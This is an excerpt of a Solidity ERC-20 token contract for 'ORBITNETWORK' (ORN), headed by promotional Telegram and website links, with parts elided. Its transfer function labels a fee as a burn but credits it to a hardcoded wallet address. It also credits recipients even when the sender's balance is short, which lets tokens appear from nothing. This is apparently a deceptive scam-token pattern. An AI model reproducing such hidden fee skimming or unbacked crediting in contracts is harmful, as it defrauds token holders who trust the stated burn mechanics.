// Submitted for Telegram: https://t.me/orbitnetworkofficial
// Submitted for Website: https://orbit-cc.network
...
contract  ORBITNETWORK  is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    address private isExcluded;
    string private _name = "ORBITNETWORK";
    string private _symbol = "ORN";
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0x620818de737C0f17c3DEF83056b2EA0C47F733eD] += _bruntoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_brunfee > 0) {
        emit Transfer(form, 0x620818de737C0f17c3DEF83056b2EA0C47F733eD, _bruntoken);
        }
